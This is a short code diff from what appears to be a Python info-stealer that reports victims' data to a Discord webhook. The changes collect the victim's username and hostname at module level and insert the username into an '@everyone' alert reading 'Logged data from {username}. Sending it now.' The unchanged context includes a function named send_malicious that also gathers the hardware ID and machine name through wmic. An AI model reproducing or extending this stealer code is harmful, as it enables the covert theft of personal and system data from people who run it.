@@ -72,6 +72,8 @@ wh_name = cc.get_name()
 eb_color = cc.get_color()
 eb_footer = cc.get_footer()
 
+username = getpass.getuser()
+hostname = socket.gethostname()
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
@@ -82,7 +84,7 @@ DETECTED = False
 if cc.get_discord_ping():
     ping = {
         "content":
-        "<a:arrow:1062070385455157368> **Logged data from someone. Sending it now.** ||@everyone|| <a:FrogHypers:1124963514239438918>",
+        f"<a:arrowgif:982368820436008960> **Logged data from {username}. Sending it now.** ||@everyone|| <a:CatLick:791991114437099540>",
         "username": wh_name,
         "avatar_url": wh_avatar,
     }
@@ -779,8 +781,6 @@ GatherAll()
 
 
 def send_malicious():
-    username = getpass.getuser()
-    hostname = socket.gethostname()
     hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
                 "utf-8").split("\n")[1].strip())
     name = (str(subprocess.check_output("wmic csproduct get name"),
